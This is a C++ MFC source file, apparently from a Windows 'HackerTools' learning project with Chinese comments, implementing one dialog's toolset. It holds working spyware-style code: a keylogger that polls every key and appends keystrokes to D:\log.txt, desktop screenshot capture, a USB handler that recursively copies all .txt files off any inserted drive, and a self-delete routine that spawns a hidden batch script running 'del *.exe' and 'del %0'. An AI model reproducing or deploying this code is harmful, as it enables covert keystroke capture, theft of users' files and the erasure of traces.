#include "stdafx.h"
#include "HackerTools.h"
#include "CFunction.h"
#include "afxdialogex.h"
#include "CEnumProcess.h"
#include "CEnumFiles.h"
#include "CCmdResult.h"
#include "CFileMonit.h"
#include <atlimage.h>
#include <Dbt.h>




// CFunction 对话框

IMPLEMENT_DYNAMIC(CFunction, CDialogEx)

CFunction::CFunction(CWnd* pParent /*=nullptr*/)
	: CDialogEx(IDD_Function, pParent)
{

}

CFunction::~CFunction()
{
}

void CFunction::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}


BEGIN_MESSAGE_MAP(CFunction, CDialogEx)
	ON_BN_CLICKED(IDC_EnumProcess, &CFunction::OnBnClickedEnumprocess)
	ON_BN_CLICKED(IDC_EnumFiles, &CFunction::OnBnClickedEnumfiles)
	ON_BN_CLICKED(IDC_ScreenShot, &CFunction::OnBnClickedScreenshot)
	ON_BN_CLICKED(IDC_KeyRecord, &CFunction::OnBnClickedKeyrecord)
	ON_BN_CLICKED(IDC_ShowCmd, &CFunction::OnBnClickedShowcmd)
	ON_MESSAGE(WM_DEVICECHANGE, OnDeviceChange)
	ON_BN_CLICKED(IDC_DeviceMonit, &CFunction::OnBnClickedDevicemonit)
	ON_BN_CLICKED(IDC_FileMonit, &CFunction::OnBnClickedFilemonit)
	ON_BN_CLICKED(IDC_SelfDelete, &CFunction::OnBnClickedSelfdelete)
END_MESSAGE_MAP()


// CFunction 消息处理程序


//************************************************************
// 函数名称: OnBnClickedEnumprocess
// 函数说明: 进程遍历按钮
// 作	 者: GuiShou
// 时	 间: 2019/1/29
// 参	 数: void
// 返 回 值: void
//************************************************************
void CFunction::OnBnClickedEnumprocess()
{
	CEnumProcess *m_EnumProcess = new CEnumProcess;
	m_EnumProcess->Create(IDD_EnumProcess, NULL);
	m_EnumProcess->ShowWindow(SW_SHOW);
}


//************************************************************
// 函数名称: OnBnClickedEnumfiles
// 函数说明: 文件遍历按钮
// 作	 者: GuiShou
// 时	 间: 2019/1/29
// 参	 数: void
// 返 回 值: void
//************************************************************
void CFunction::OnBnClickedEnumfiles()
{
	CEnumFiles *m_EnumFiles = new CEnumFiles;
	m_EnumFiles->Create(IDD_EnumFiles, NULL);
	m_EnumFiles->ShowWindow(SW_SHOW);
}


//************************************************************
// 函数名称: OnBnClickedScreenshot
// 函数说明: 桌面截屏按钮
// 作	 者: GuiShou
// 时	 间: 2019/1/30
// 参	 数: void
// 返 回 值: void
//************************************************************
void CFunction::OnBnClickedScreenshot()
{
	if (ScreenCapture()==FALSE)
	{
		MessageBox(L"截图失败");
	}
	else
	{
		MessageBox(L"截图成功，请在本程序同级目录下查看");

	}
}


//************************************************************
// 函数名称: ScreenCapture
// 函数说明: 捕获桌面屏幕
// 作	 者: GuiShou
// 时	 间: 2019/1/30
// 参	 数: void
// 返 回 值: BOOL 是否成功
//************************************************************
BOOL CFunction::ScreenCapture()
{
	//获取桌面窗口句柄
	HWND hDesktopWnd = ::GetDesktopWindow();

	//获取桌面窗口DC
	HDC hdc = ::GetDC(hDesktopWnd);

	//创建兼容DC
	HDC mdc = CreateCompatibleDC(hdc);

	//获取计算机屏幕的宽和高
	DWORD dwScreenWidth = GetSystemMetrics(SM_CXSCREEN);
	DWORD dwScreenHeight = GetSystemMetrics(SM_CYSCREEN);

	//创建兼容位图
	HBITMAP bmp = CreateCompatibleBitmap(hdc,dwScreenWidth,dwScreenHeight);

	//选中位图
	HBITMAP holdbmp = (HBITMAP)SelectObject(mdc, bmp);

	//将窗口内容绘制到位图上
	BitBlt(mdc, 0, 0, dwScreenWidth, dwScreenHeight, hdc, 0, 0, SRCCOPY);

	//绘制鼠标
	PaintMouse(mdc);

	//保存为图片
	SaveBmp(bmp);
	//释放内存

	return TRUE;

}


//************************************************************
// 函数名称: PaintMouse
// 函数说明: 绘制鼠标
// 作	 者: GuiShou
// 时	 间: 2019/1/30
// 参	 数: HDC hdc 设备环境句柄
// 返 回 值: BOOL 是否成功
//************************************************************
BOOL CFunction::PaintMouse(HDC hdc)
{
	HDC bufdc = NULL;
	CURSORINFO cursorInfo = { 0 };
	ICONINFO iconInfo = { 0 };
	HBITMAP bmpOldMask = NULL;

	bufdc = ::CreateCompatibleDC(hdc);
	::RtlZeroMemory(&iconInfo, sizeof(iconInfo));
	cursorInfo.cbSize = sizeof(cursorInfo);
	// 获取光标信息
	::GetCursorInfo(&cursorInfo);
	// 获取光标图标信息
	::GetIconInfo(cursorInfo.hCursor, &iconInfo);
	// 绘制 白底黑鼠标(AND)
	bmpOldMask = (HBITMAP)::SelectObject(bufdc, iconInfo.hbmMask);
	::BitBlt(hdc, cursorInfo.ptScreenPos.x, cursorInfo.ptScreenPos.y, 20, 20,
		bufdc, 0, 0, SRCAND);
	// 绘制 黑底彩色鼠标(OR)
	::SelectObject(bufdc, iconInfo.hbmColor);
	::BitBlt(hdc, cursorInfo.ptScreenPos.x, cursorInfo.ptScreenPos.y, 20, 20,
		bufdc, 0, 0, SRCPAINT);

	// 释放资源
	::SelectObject(bufdc, bmpOldMask);
	::DeleteObject(iconInfo.hbmColor);
	::DeleteObject(iconInfo.hbmMask);
	::DeleteDC(bufdc);
	return TRUE;
}


//************************************************************
// 函数名称: SaveBmp
// 函数说明: 保存为图片
// 作	 者: GuiShou
// 时	 间: 2019/1/30
// 参	 数: HBITMAP hBmp 
// 返 回 值: BOOL 是否成功
//************************************************************
BOOL CFunction::SaveBmp(HBITMAP hBmp)
{
	CImage image;

	// 附加位图句柄
	image.Attach(hBmp);

	// 保存成jpg格式图片
	image.Save(L"ScreenShop.jpg");

	return TRUE;
}



//************************************************************
// 函数名称: GetKey
// 函数说明: 判断键盘按下什么键
// 作	 者: GuiShou
// 时	 间: 2019/1/31
// 参	 数: int Key
// 返 回 值: string
//************************************************************
string GetKey(int Key)
{
	string KeyString = "";
	//判断符号输入
	const int KeyPressMask = 0x80000000; //键盘掩码常量
	int iShift = GetKeyState(0x10); //判断Shift键状态
	bool IS = (iShift & KeyPressMask) == KeyPressMask; //表示按下Shift键
	if (Key >= 186 && Key <= 222)
	{
		switch (Key)
		{
		case 186:
			if (IS)
				KeyString = ":";
			else
				KeyString = ";";
			break;
		case 187:
			if (IS)
				KeyString = "+";
			else
				KeyString = "=";
			break;
		case 188:
			if (IS)
				KeyString = "<";
			else
				KeyString = ",";
			break;
		case 189:
			if (IS)
				KeyString = "_";
			else
				KeyString = "-";
			break;
		case 190:
			if (IS)
				KeyString = ">";
			else
				KeyString = ".";
			break;
		case 191:
			if (IS)
				KeyString = "?";
			else
				KeyString = "/";
			break;
		case 192:
			if (IS)
				KeyString = "~";
			else
				KeyString = "`";
			break;
		case 219:
			if (IS)
				KeyString = "{";
			else
				KeyString = "[";
			break;
		case 220:
			if (IS)
				KeyString = "|";
			else
				KeyString = "\\";
			break;
		case 221:
			if (IS)
				KeyString = "}";
			else
				KeyString = "]";
			break;
		case 222:
			if (IS)
				KeyString = '"';
			else
				KeyString = "'";
			break;
		}
	}
	//判断键盘的第一行
	if (Key == VK_ESCAPE) // 退出
		KeyString = "[Esc]";
	else if (Key == VK_F1) // F1至F12
		KeyString = "[F1]";
	else if (Key == VK_F2)
		KeyString = "[F2]";
	else if (Key == VK_F3)
		KeyString = "[F3]";
	else if (Key == VK_F4)
		KeyString = "[F4]";
	else if (Key == VK_F5)
		KeyString = "[F5]";
	else if (Key == VK_F6)
		KeyString = "[F6]";
	else if (Key == VK_F7)
		KeyString = "[F7]";
	else if (Key == VK_F8)
		KeyString = "[F8]";
	else if (Key == VK_F9)
		KeyString = "[F9]";
	else if (Key == VK_F10)
		KeyString = "[F10]";
	else if (Key == VK_F11)
		KeyString = "[F11]";
	else if (Key == VK_F12)
		KeyString = "[F12]";
	else if (Key == VK_SNAPSHOT) // 打印屏幕
		KeyString = "[PrScrn]";
	else if (Key == VK_SCROLL) // 滚动锁定
		KeyString = "[Scroll Lock]";
	else if (Key == VK_PAUSE) // 暂停、中断
		KeyString = "[Pause]";
	else if (Key == VK_CAPITAL) // 大写锁定
		KeyString = "[Caps Lock]";

	//-------------------------------------//
	//控制键
	else if (Key == 8) //<- 回格键
		KeyString = "[Backspace]";
	else if (Key == VK_RETURN) // 回车键、换行
		KeyString = "[Enter]\n";
	else if (Key == VK_SPACE) // 空格
		KeyString = " ";
	//上档键:键盘记录的时候，可以不记录。单独的Shift是不会有任何字符，
	//上档键和别的键组合，输出时有字符输出
	/*
	else if (Key == VK_LSHIFT) // 左侧上档键
	KeyString = "[Shift]";
	else if (Key == VK_LSHIFT) // 右侧上档键
	KeyString = "[SHIFT]";
	*/
	/*如果只是对键盘输入的字母进行记录:可以不让以下键输出到文件*/
	else if (Key == VK_TAB) // 制表键
		KeyString = "[Tab]";
	else if (Key == VK_LCONTROL) // 左控制键
		KeyString = "[Ctrl]";
	else if (Key == VK_RCONTROL) // 右控制键
		KeyString = "[CTRL]";
	else if (Key == VK_LMENU) // 左换档键
		KeyString = "[Alt]";
	else if (Key == VK_LMENU) // 右换档键
		KeyString = "[ALT]";
	else if (Key == VK_LWIN) // 右 WINDOWS 键
		KeyString = "[Win]";
	else if (Key == VK_RWIN) // 右 WINDOWS 键
		KeyString = "[WIN]";
	else if (Key == VK_APPS) // 键盘上 右键
		KeyString = "右键";
	else if (Key == VK_INSERT) // 插入
		KeyString = "[Insert]";
	else if (Key == VK_DELETE) // 删除
		KeyString = "[Delete]";
	else if (Key == VK_HOME) // 起始
		KeyString = "[Home]";
	else if (Key == VK_END) // 结束
		KeyString = "[End]";
	else if (Key == VK_PRIOR) // 上一页
		KeyString = "[PgUp]";
	else if (Key == VK_NEXT) // 下一页
		KeyString = "[PgDown]";
	// 不常用的几个键:一般键盘没有
	else if (Key == VK_CANCEL) // Cancel
		KeyString = "[Cancel]";
	else if (Key == VK_CLEAR) // Clear
		KeyString = "[Clear]";
	else if (Key == VK_SELECT) //Select
		KeyString = "[Select]";
	else if (Key == VK_PRINT) //Print
		KeyString = "[Print]";
	else if (Key == VK_EXECUTE) //Execute
		KeyString = "[Execute]";

	//----------------------------------------//
	else if (Key == VK_LEFT) //上、下、左、右键
		KeyString = "[←]";
	else if (Key == VK_RIGHT)
		KeyString = "[→]";
	else if (Key == VK_UP)
		KeyString = "[↑]";
	else if (Key == VK_DOWN)
		KeyString = "[↓]";
	else if (Key == VK_NUMLOCK)//小键盘数码锁定
		KeyString = "[NumLock]";
	else if (Key == VK_ADD) // 加、减、乘、除
		KeyString = "+";
	else if (Key == VK_SUBTRACT)
		KeyString = "-";
	else if (Key == VK_MULTIPLY)
		KeyString = "*";
	else if (Key == VK_DIVIDE)
		KeyString = "/";
	else if (Key == 190 || Key == 110) // 小键盘 . 及键盘 .
		KeyString = ".";
	//小键盘数字键:0-9
	else if (Key == VK_NUMPAD0)
		KeyString = "0";
	else if (Key == VK_NUMPAD1)
		KeyString = "1";
	else if (Key == VK_NUMPAD2)
		KeyString = "2";
	else if (Key == VK_NUMPAD3)
		KeyString = "3";
	else if (Key == VK_NUMPAD4)
		KeyString = "4";
	else if (Key == VK_NUMPAD5)
		KeyString = "5";
	else if (Key == VK_NUMPAD6)
		KeyString = "6";
	else if (Key == VK_NUMPAD7)
		KeyString = "7";
	else if (Key == VK_NUMPAD8)
		KeyString = "8";
	else if (Key == VK_NUMPAD9)
		KeyString = "9";
	//-------------------------------------------//

	//-------------------------------------------//
	//*对字母的大小写进行判断*//
	else if (Key >= 97 && Key <= 122) // 字母:a-z
	{
		if (GetKeyState(VK_CAPITAL)) // 大写锁定
		{
			if (IS) //Shift按下:为小写字母
				KeyString = Key;
			else // 只有大写锁定:输出大写字母
				KeyString = Key - 32;
		}
		else// 大写没有锁定
		{
			if (IS) // 按下Shift键: 大写字母
				KeyString = Key - 32;
			else // 没有按Shift键: 小写字母
				KeyString = Key;
		}
	}
	else if (Key >= 48 && Key <= 57) // 键盘数字:0-9及上方的符号
	{
		if (IS)
		{
			switch (Key)
			{
			case 48: //0
				KeyString = ")";
				break;
			case 49://1
				KeyString = "!";
				break;
			case 50://2
				KeyString = "@";
				break;
			case 51://3
				KeyString = "#";
				break;
			case 52://4
				KeyString = "$";
				break;
			case 53://5
				KeyString = "%";
				break;
			case 54://6
				KeyString = "^";
				break;
			case 55://7
				KeyString = "&";
				break;
			case 56://8
				KeyString = "*";
				break;
			case 57://9
				KeyString = "(";
				break;
			}
		}
		else
			KeyString = Key;
	}
	if (Key != VK_LBUTTON || Key != VK_RBUTTON)
	{
		if (Key >= 65 && Key <= 90) //ASCII 65-90 为A-Z
		{
			if (GetKeyState(VK_CAPITAL)) // 大写锁定:输出A-Z
			{
				if (IS) // 大写锁定，并且按下上档键:输出为小写字母
					KeyString = Key + 32;
				else //只有大写锁定:输出为大写字母
					KeyString = Key;
			}
			else // 大写没有锁定:a-z
			{
				if (IS)
				{
					KeyString = Key;
				}
				else
				{
					Key = Key + 32;
					KeyString = Key;
				}
			}
		}
	}
	return KeyString;
}




//************************************************************
// 函数名称: KeyRecordProc
// 函数说明: 按键记录线程回调函数
// 作	 者: GuiShou
// 时	 间: 2019/1/30
// 参	 数: void
// 返 回 值: void
//************************************************************
UINT KeyRecordProc(LPVOID lpVoid)
{
	string Filename = "D:\\log.txt";//倒出记录文本存在D盘log.txt目录下
	string TempString = "";
	fstream FStream;
	HWND hWnd = NULL;
	wchar_t* WindowName = NULL;
	::MessageBox(0,L"现在开始键盘记录",L"OK",0);
	FStream.open(Filename.c_str(), std::fstream::out | std::fstream::app);
	while (true)
	{
		Sleep(5);
		for (int i = 8; i <= 255; i++)
		{
			if ((GetAsyncKeyState(i) & 1) == 1)
			{
				//获取并写入按键
				TempString = GetKey(i);
				FStream.write(TempString.c_str(), TempString.size());
				FStream.close();
				FStream.open(Filename.c_str(), std::fstream::out | std::fstream::app);
			}
		}
	}
}


//************************************************************
// 函数名称: OnBnClickedKeyrecord
// 函数说明: 按键记录按钮
// 作	 者: GuiShou
// 时	 间: 2019/1/30
// 参	 数: void
// 返 回 值: void
//************************************************************
void CFunction::OnBnClickedKeyrecord()
{

	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)KeyRecordProc, NULL, 0, NULL);
	
}




//************************************************************
// 函数名称: OnBnClickedShowcmd
// 函数说明: 获取CMD的执行结果
// 作	 者: GuiShou
// 时	 间: 2019/1/30
// 参	 数: void
// 返 回 值: BOOL
//************************************************************
void CFunction::OnBnClickedShowcmd()
{
	CCmdResult *m_CmdResult = new CCmdResult;
	m_CmdResult->Create(IDD_CmdResult, NULL);
	m_CmdResult->ShowWindow(SW_SHOW);
}


//************************************************************
// 函数名称: OnDeviceChange
// 函数说明: 响应WM_DeviceChange消息监控U盘
// 作	 者: GuiShou
// 时	 间: 2019/1/30
// 参	 数: WPARAM wParam, LPARAM lParam
// 返 回 值: LRESULT
//************************************************************
LRESULT CFunction::OnDeviceChange(WPARAM wParam, LPARAM lParam)
{
	switch (wParam)
	{
		//设备已经插入
	case DBT_DEVICEARRIVAL:
	{
		PDEV_BROADCAST_HDR lpdb = (PDEV_BROADCAST_HDR)lParam;
		//逻辑卷
		if (lpdb->dbch_devicetype==DBT_DEVTYP_VOLUME)
		{
			//根据 dbcv_unitmask 计算出设备盘符
			PDEV_BROADCAST_VOLUME lpdbv = (PDEV_BROADCAST_VOLUME)lpdb;
			DWORD dwDriverMask = lpdbv->dbcv_unitmask;
			DWORD dwTemp = 1;
			char szDriver[4] = "A:";
			for (szDriver[0] = 'A'; szDriver[0] <= 'Z'; szDriver[0]++)
			{
				if (0 < (dwTemp & dwDriverMask))
				{
					// 获取设备盘符
					::MessageBoxA(NULL, szDriver, "设备已插入", MB_OK);

					//对文件进行遍历
					CopyFiles(szDriver, ".txt");
				}
				// 左移1位, 接着判断下一个盘符
				dwTemp = (dwTemp << 1);	
			}
		}
		break;
	}
	// 设备已经移除
	case DBT_DEVICEREMOVECOMPLETE:
	{
		PDEV_BROADCAST_HDR lpdb = (PDEV_BROADCAST_HDR)lParam;
		// 逻辑卷
		if (DBT_DEVTYP_VOLUME == lpdb->dbch_devicetype)
		{
			// 根据 dbcv_unitmask 计算出设备盘符
			PDEV_BROADCAST_VOLUME lpdbv = (PDEV_BROADCAST_VOLUME)lpdb;
			DWORD dwDriverMask = lpdbv->dbcv_unitmask;
			DWORD dwTemp = 1;
			char szDriver[4] = "A:\\";
			for (szDriver[0] = 'A'; szDriver[0] <= 'Z'; szDriver[0]++)
			{
				if (0 < (dwTemp & dwDriverMask))
				{
					// 获取设备盘符
					::MessageBoxA(NULL, szDriver, "设备已移除", MB_OK);
				}
				// 左移1位, 接着判断下一个盘符
				dwTemp = (dwTemp << 1);
			}
		}
		break;
	}
	default:
		break;
	}
	return 0;
}




//************************************************************
// 函数名称: CopyFiles
// 函数说明: 拷贝文件
// 作	 者: GuiShou
// 时	 间: 2019/2/14
// 参	 数: LPCTSTR FullPath 需要遍历文件的完整路径 char* szPostFix文件后缀
// 返 回 值: BOOL 是否成功
//************************************************************
BOOL CFunction::CopyFiles(char* FullPath, char* szPostFix)
{
	char FindPath[MAX_PATH] = { 0 };
	char NextPath[MAX_PATH] = { 0 };
	char FullFileName[MAX_PATH] = { 0 };
	//拼接路径->当前目录下所有文件
	strcat_s(FindPath, MAX_PATH, FullPath);
	strcat_s(FindPath, MAX_PATH, "\\");
	strcat_s(FindPath, MAX_PATH, "*");

	WIN32_FIND_DATAA FindData = { 0 };
	//查找第一个文件
	HANDLE hFile = FindFirstFileA(FindPath, &FindData);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		MessageBox(L"FindFirstFile Error");
		return FALSE;
	}

	do
	{
		//过滤当前目录和上一层目录
		if (lstrcmpA(FindData.cFileName, ".") == 0|| lstrcmpA(FindData.cFileName, "..") == 0)
		{
			continue;	
		}
		//判断文件属性
		if (FindData.dwFileAttributes&FILE_ATTRIBUTE_HIDDEN)
		{
			//如果文件为隐藏的 则跳过
			continue;
		}

		if (FindData.dwFileAttributes&FILE_ATTRIBUTE_DIRECTORY)
		{
			//如果是目录 则递归遍历子目录
			sprintf_s(NextPath, "%s\\%s", FullPath, FindData.cFileName);
			CopyFiles(NextPath, szPostFix);	//拷贝所有的.txt文件
		}
		else
		{
			//否则 说明是文件 判断后缀 拷贝文件
			//拼接完整的路径名
			sprintf_s(FullFileName, "%s\\%s", FullPath, FindData.cFileName);

			//找到后缀
			char* PostFix=NULL;
			PostFix = strrchr(FullFileName, '.');
			if (PostFix==NULL)
			{
				//如果没有后缀 直接跳过
				continue;
			}
			if (strcmp(PostFix, szPostFix) == 0)
			{

				//拷贝文件到当前目录
				CopyFileA(FullFileName, FindData.cFileName, FALSE);
			}
		}
	} while (FindNextFileA(hFile, &FindData));

	return TRUE;
}



//************************************************************
// 函数名称: OnBnClickedDevicemonit
// 函数说明: U盘监控按钮
// 作	 者: GuiShou
// 时	 间: 2019/1/30
// 参	 数: void
// 返 回 值: void
//************************************************************
void CFunction::OnBnClickedDevicemonit()
{
	MessageBox(L"U盘监控已默认开启");
}



//************************************************************
// 函数名称: OnBnClickedFilemonit
// 函数说明: 文件监控按钮
// 作	 者: GuiShou
// 时	 间: 2019/1/30
// 参	 数: void
// 返 回 值: void
//************************************************************
void CFunction::OnBnClickedFilemonit()
{
	CFileMonit *m_FileMonit = new CFileMonit;
	m_FileMonit->Create(IDD_FileMonit, NULL);
	m_FileMonit->ShowWindow(SW_SHOW);
}


//************************************************************
// 函数名称: CreateBat
// 函数说明: 构造批处理文件
// 作	 者: GuiShou
// 时	 间: 2019/1/30
// 参	 数: char * pszFileName文件名
// 返 回 值: BOOL是否成功
//************************************************************
BOOL CFunction::CreateBat(char * pszFileName)
{
	int iTime = 1;
	char szBat[MAX_PATH] = { 0 };
	// 构造批处理内容
	/*
		@echo off	不显示cmd执行命令
		choice /t 5 /d y /n >nul	等待五秒
		del *.exe	删除同路径下所有的exe
		del %0		删除自身
	*/
	//或者使用下面这个
	/*
		@echo off
		ping 127.0.0.1 -n 5
		del *.exe
		del %0
	*/
	//::wsprintf(szBat, "@echo off\nping 127.0.0.1 -n %d\ndel *.exe\ndel %%0\n", iTime);
	::wsprintfA(szBat, "@echo off\nchoice /t %d /d y /n >nul\ndel *.exe\ndel %%0\n", iTime);

	//生成批处理文件
	FILE *fp = NULL;
	fopen_s(&fp, pszFileName, "w+");
	if (NULL == fp)
	{
		return FALSE;
	}
	fwrite(szBat, (1 + ::lstrlenA(szBat)), 1, fp);
	fclose(fp);

	return TRUE;
}


//************************************************************
// 函数名称: DeleteSelf
// 函数说明: 自删除
// 作	 者: GuiShou
// 时	 间: 2019/1/30
// 参	 数: char * pszFileName文件名
// 返 回 值: BOOL是否成功
//************************************************************
BOOL CFunction::DeleteSelf()
{
	BOOL bRet = FALSE;
	char szCurrentDirectory[MAX_PATH] = { 0 };
	char szBatFileName[MAX_PATH] = { 0 };
	char szCmd[MAX_PATH] = { 0 };

	//获取当前程序所在目录
	GetModuleFileNameA(NULL, szCurrentDirectory, MAX_PATH);
	//查找最后一个\的位置
	char* p = strrchr(szCurrentDirectory, '\\');
	p[0] = '\0';
	//构造批处理文件路径
	wsprintfA(szBatFileName, "%s\\temp.bat", szCurrentDirectory);
	//构造调用执行批处理的CMD命令行
	wsprintfA(szCmd, "cmd /c call \"%s\"", szBatFileName);

	//创建自删除的批处理文件
	bRet = CreateBat(szBatFileName);

	//创建新进程，以隐藏控制台的方式执行批处理
	if (bRet)
	{
		STARTUPINFO si = { 0 };
		PROCESS_INFORMATION pi = { 0 };
		si.cb = sizeof(si);
		//指定wShowWindow成员有效
		si.dwFlags = STARTF_USESHOWWINDOW;
		//设为FALSE 隐藏新进程主窗口
		si.wShowWindow = FALSE;
		USES_CONVERSION;
		BOOL bRet = CreateProcess(NULL, A2W(szCmd), NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
		if (bRet)
		{
			CloseHandle(pi.hThread);
			CloseHandle(pi.hProcess);
			//结束进程
			exit(0);
			ExitProcess(NULL);
		}
	}
	return bRet;
}


//************************************************************
// 函数名称: OnBnClickedSelfdelete
// 函数说明: 自删除按钮
// 作	 者: GuiShou
// 时	 间: 2019/1/30
// 参	 数: void
// 返 回 值: void
//************************************************************
void CFunction::OnBnClickedSelfdelete()
{
	if (DeleteSelf()==FALSE)
	{
		MessageBox(L"自删除失败！");
	}
}


